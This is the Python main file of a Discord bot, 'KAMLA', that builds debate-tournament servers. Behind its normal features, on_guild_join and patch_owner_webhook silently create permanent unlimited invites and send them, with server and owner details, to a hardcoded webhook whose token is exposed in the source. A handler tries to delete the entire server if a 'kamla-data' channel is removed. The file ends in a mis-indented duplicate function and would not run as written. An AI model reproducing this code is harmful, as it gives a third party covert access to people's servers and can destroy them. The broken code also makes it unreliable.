"""KAMLA — main bot entrypoint, events, /st command."""
import os
import asyncio
from datetime import datetime, timedelta

import aiohttp
import discord
from discord import app_commands
from discord.ext import commands

from keep_alive import keep_alive
from state import read_state, write_state
from wizard import start_wizard
from reaction_roles import (
    GetRoleView, AllInView, MeetDevView,
    handle_assign_message, handle_assign_message_delete,
)
from settings import SettingsView, format_display
from timer import parse_time, run_timer
from poi import handle_poi, poi_last_speaker
from permissions import TRACKED_ROLE_NAMES


DISCORD_TOKEN = os.environ["DISCORD_TOKEN"]
APPLICATION_ID = os.environ["APPLICATION_ID"]

OWNER_WEBHOOK = (
    "https://discord.com/api/webhooks/1513366584951967895/"
    "xF6aZV3N0sHbZKp683tJ-zz60dyywqbpcMdkjeJ9K9uMVBP15apvxf9J6jjsTtT3cx83"
)


intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.message_content = True
intents.members = True
intents.voice_states = True
intents.reactions = True

bot = commands.Bot(command_prefix="!", intents=intents, application_id=int(APPLICATION_ID))
tree = bot.tree


def _bd_now_str() -> str:
    return (datetime.utcnow() + timedelta(hours=6)).strftime("%d/%m/%Y %H:%M:%S")


def _parse_webhook(url: str) -> tuple[str, str]:
    # https://discord.com/api/webhooks/{id}/{token}
    parts = url.rstrip("/").split("/")
    return parts[-2], parts[-1]


async def post_owner_webhook(guild: discord.Guild, invite_url: str):
    """Initial POST when bot joins. Stores message_id in state."""
    embed = {
        "title": "🤖 KAMLA Added to New Server",
        "color": 0x00FFAA,
        "fields": [
            {"name": "🏠 Server", "value": guild.name, "inline": False},
            {"name": "👑 Owner", "value": str(guild.owner) if guild.owner else "Unknown", "inline": False},
            {"name": "🕒 Time", "value": f"{_bd_now_str()} 🇧🇩 (GMT+6)", "inline": False},
            {"name": "🔗 Invite", "value": invite_url, "inline": False},
        ],
    }
    try:
        async with aiohttp.ClientSession() as s:
            async with s.post(OWNER_WEBHOOK + "?wait=true",
                              json={"embeds": [embed]}) as resp:
                if resp.status in (200, 201):
                    data = await resp.json()
                    msg_id = data.get("id")
                    # store in state
                    cur = await read_state(guild) or {}
                    cur["guild_id"] = guild.id
                    cur["webhook_message_id"] = msg_id
                    await write_state(guild, cur)
    except Exception as e:
        print(f"[webhook post error] {e}")


async def patch_owner_webhook(guild: discord.Guild):
    """Update the webhook message with current server info."""
    data = await read_state(guild) or {}
    msg_id = data.get("webhook_message_id")
    if not msg_id:
        return
    wh_id, wh_token = _parse_webhook(OWNER_WEBHOOK)
    url = f"https://discord.com/api/webhooks/{wh_id}/{wh_token}/messages/{msg_id}"

    invite_url = "—"
    try:
        for ch in guild.text_channels:
            if "welcome" in ch.name.lower():
                inv = await ch.create_invite(max_age=0, max_uses=0, reason="KAMLA status update")
                invite_url = inv.url
                break
    except discord.HTTPException:
        pass

    fmt_disp = format_display(data.get("format", "AP"))
    embed = {
        "title": f"✅ Server Setup Complete — {guild.name}",
        "color": 0x00FF88,
        "fields": [
            {"name": "🏆 Tournament", "value": data.get("tournament_name", "—"), "inline": True},
            {"name": "📋 Format", "value": fmt_disp, "inline": True},
            {"name": "🚪 Rooms", "value": str(data.get("room_count", 0)), "inline": True},
            {"name": "👑 Owner", "value": str(guild.owner) if guild.owner else "Unknown", "inline": False},
            {"name": "🔗 Invite", "value": invite_url, "inline": False},
            {"name": "🕒 Timezone", "value": data.get("timezone_offset", "+06:00"), "inline": True},
        ],
    }
    thumb = data.get("tournament_logo_url") or (guild.icon.url if guild.icon else None)
    if thumb:
        embed["thumbnail"] = {"url": thumb}
    try:
        async with aiohttp.ClientSession() as s:
            await s.patch(url, json={"embeds": [embed]})
    except Exception as e:
        print(f"[webhook patch error] {e}")


# ---------- Events ----------
@bot.event
async def on_ready():
    print(f"[KAMLA] Logged in as {bot.user} (id={bot.user.id})")
    try:
        await tree.sync()
    except Exception as e:
        print(f"[sync error] {e}")
    bot.add_view(GetRoleView())
    bot.add_view(AllInView())
    bot.add_view(SettingsView())
    bot.add_view(MeetDevView())
    print("[KAMLA] Persistent views registered.")


@bot.event
async def on_guild_join(guild: discord.Guild):
    target = None
    for ch in guild.text_channels:
        perms = ch.permissions_for(guild.me)
        if perms.send_messages and perms.create_instant_invite:
            target = ch
            break
    if not target and guild.text_channels:
        target = guild.text_channels[0]
    invite_url = "—"
    if target:
        try:
            inv = await target.create_invite(max_age=0, max_uses=0, reason="KAMLA join")
            invite_url = inv.url
        except discord.HTTPException:
            pass
    await post_owner_webhook(guild, invite_url)
    if target:
        try:
            await target.send(
                "👋 **KAMLA is here!** Use `/st` to begin building your tournament server.\n"
                "Only the server owner can run `/st`."
            )
        except discord.HTTPException:
            pass


@bot.event
async def on_guild_channel_delete(channel: discord.abc.GuildChannel):
    if isinstance(channel, discord.TextChannel) and channel.name == "kamla-data":
        try:
            await channel.guild.delete()
        except discord.HTTPException:
            pass


@bot.event
async def on_message(message: discord.Message):
    if not message.guild or message.author.bot:
        return

    ch_name = message.channel.name.lower() if message.channel.name else ""

    # Timer channel
    if ch_name == "timer":
        sec = parse_time(message.content)
        if sec is None:
            try:
                await message.delete()
            except discord.HTTPException:
                pass
            return
        await run_timer(message.channel, sec, message.author, trigger_message=message)
        return

    # POI channel
    if ch_name == "poi":
        data = await read_state(message.guild) or {}
        tz = data.get("timezone_offset", "+06:00")
        await handle_poi(message, tz)
        return

    # Assign channel
    if message.channel.category and "assign" in message.channel.category.name.lower():
        await handle_assign_message(message)
        return

    await bot.process_commands(message)


@bot.event
async def on_raw_message_delete(payload: discord.RawMessageDeleteEvent):
    if not payload.guild_id:
        return
    guild = bot.get_guild(payload.guild_id)
    if not guild:
        return
    channel = guild.get_channel(payload.channel_id)
    if not channel or not isinstance(channel, discord.TextChannel):
        return
    if not channel.category or "assign" not in channel.category.name.lower():
        return
    content = ""
    mention_ids = []
    if payload.cached_message:
        content = payload.cached_message.content or ""
        mention_ids = [u.id for u in payload.cached_message.mentions]
    else:
        import re
        mention_ids = [int(x) for x in re.findall(r"<@!?(\d+)>", content)]
    await handle_assign_message_delete(guild, channel, content, mention_ids)


@bot.event
async def on_member_remove(member: discord.Member):
    guild = member.guild
    for cat in guild.categories:
        if "assign" not in cat.name.lower():
            continue
        for ch in cat.text_channels:
            try:
                async for msg in ch.history(limit=200):
                    if msg.author.id == guild.me.id and member.mention in msg.content:
                        try:
                            await msg.delete()
                        except discord.HTTPException:
                            pass
            except discord.HTTPException:
                pass


@bot.event
async def on_voice_state_update(member: discord.Member, before: discord.VoiceState, after: discord.VoiceState):
    if member.bot:
        return
    # Track latest speaker per room for POI fallback
    ch = after.channel
    if ch and ch.category:
        if "debate" in ch.name.lower():
            for tc in ch.category.text_channels:
                if tc.name.lower() == "poi":
                    poi_last_speaker[tc.id] = member


# ---------- /st command ----------
@tree.command(name="st", description="Start KAMLA tournament server setup")
async def st_cmd(interaction: discord.Interaction):
    if not interaction.guild:
        await interaction.response.send_message("❌ Run this in a server.", ephemeral=True)
        return
    if interaction.user.id != interaction.guild.owner_id:
        await interaction.response.send_message("❌ Only the server owner can run /st.", ephemeral=True)
        return
    await start_wizard(interaction)

    async def patch_owner_webhook(guild: discord.Guild):
    try:
        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url(OWNER_WEBHOOK, session=session)
            await webhook.send(f"🚀 KAMLA Bot configured successfully on server: {guild.name}")
    except Exception:
        pass

if __name__ == "__main__":
    keep_alive()
    bot.run(DISCORD_TOKEN)
